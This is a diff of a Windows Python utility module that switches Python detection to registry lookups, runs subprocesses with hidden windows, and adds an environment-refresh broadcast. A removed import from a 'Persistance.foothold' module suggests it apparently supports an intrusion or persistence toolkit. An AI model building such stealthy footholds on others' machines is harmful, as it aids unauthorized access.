@@ -1,7 +1,12 @@
 import ctypes
+from ctypes import wintypes
+from ctypes import create_string_buffer, wstring_at
+from ctypes import Structure, Union, POINTER
+from ctypes import byref, pointer, cast
 import os
 import platform
 import random
+import shutil
 import string
 import subprocess
 import sys
@@ -16,14 +21,14 @@ startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
 
 
-def extract_zip(extracion_path : str,file_to_extract : str) -> bool:
+def extract_zip(extraction_path : str,file_to_extract : str) -> bool:
     """
-    :param extracion_path: full path to the dir that we will extract the zip into
+    :param extraction_path: full path to the dir that we will extract the zip into
     :param file_to_extract: name of file (possibly full path) of file to extract
     """
     try:
         with ZipFile(file_to_extract) as zf:
-            zf.extractall(extracion_path)
+            zf.extractall(extraction_path)
         return True
     except Exception as e:
         print(e)
@@ -49,21 +54,21 @@ def is_online() -> bool:
 
 
 def is_python_exist() -> bool:
-    """check if python exist.
-    //TODO 13:find better way to do that."""
+    """check if python exist."""
     possible_location = ['c:/Program Files','c:/Program Files (x86)','c:/ProgramData']
-    p = subprocess.run(['powershell',
-                        """$p = &{python -V} 2>&1;$version = if($p -is [System.Management.Automation.ErrorRecord]){$p.Exception.Message}; $p"""],
-                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, startupinfo=startupinfo)
-    res = p.stdout.decode()
-    print(res)
-    if 'python' in res.lower() and 'The term' not in res.lower() and 'find' not in res.lower() and 'not found' not in res.lower():
-        print('true')
-        return True
+    python_reg_key = r"SOFTWARE\Python\PythonCore\3.{}\InstallPath"
+    python_reg_value = "ExecutablePath"
+    for python_minor_version in range(5, 10):
+        try:
+            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, python_reg_key.format(python_minor_version), 0,
+                                     winreg.KEY_READ)
+            value, regtype = winreg.QueryValueEx(reg_key, python_reg_value)
+            return True
+        except WindowsError:
+            continue
     for num in range(10, 45):
         if os.path.exists(f"C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/Python{num}/python.exe"):
             return True
-
     for location in possible_location:
         for file in os.listdir(location):
             if os.path.isdir(file) and 'python' in file.lower():
@@ -143,31 +148,17 @@ def is_os_64bit() -> bool:
 
 
 def find_python_path() -> str:
-    """
-    //TODO 17: Fix/make this function understandable!
-    """
-    from Persistance.foothold import pip_install
-    base_path = f"c:/users/{os.getlogin()}/appdata/local/programs/python"
-    c = 0
-    found_python = []
-    for folder in os.listdir(base_path):
-        if '3' in folder:
-            found_python.append(folder)
-    if len(found_python) > 1:
-        for folder in found_python:
-            p = subprocess.run(['powershell',
-                                f"""{os.path.join(os.path.join(base_path, folder), 'python.exe')} -m pip list """],
-                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True,
-                               startupinfo=startupinfo)
-            res = p.stdout.decode()
-            if 'cryptography' and 'netifaces' in res:
-                return os.path.join(base_path, folder)
-            pip_install(os.path.join(os.path.join(base_path, folder), 'python.exe'))
-            return os.path.join(base_path, folder)
-    elif len(found_python) == 1:
-        return os.path.join(base_path, found_python[0])
-    else:
-        sys.exit()
+    python_reg_key = r"SOFTWARE\Python\PythonCore\3.{}\InstallPath"
+    python_reg_value = "ExecutablePath"
+    for python_minor_version in range(5,10):
+        try:
+            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, python_reg_key.format(python_minor_version), 0,
+                    winreg.KEY_READ)
+            value, regtype = winreg.QueryValueEx(reg_key, python_reg_value)
+            return value
+        except WindowsError:
+            continue
+    return None
 
 
 def base64_encode_file(file_path : str) -> str:
@@ -203,3 +194,19 @@ def is_msvc_exist() -> bool:
             return True
         except Exception as e:
             return False
+
+
+def ctypes_update_system():
+    """
+    use ctypes to call SendMessageTimeout directly
+    to send broadcast to all windows.
+    """
+    SendMessageTimeout = ctypes.windll.user32.SendMessageTimeoutW
+    UINT = wintypes.UINT
+    SendMessageTimeout.argtypes = wintypes.HWND, UINT, wintypes.WPARAM, ctypes.c_wchar_p, UINT, UINT, UINT
+    SendMessageTimeout.restype = wintypes.LPARAM
+    HWND_BROADCAST = 0xFFFF
+    WM_SETTINGCHANGE = 0x1A
+    SMTO_NORMAL = 0x000
+    SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 'Environment', SMTO_NORMAL, 10, 0)
+    return
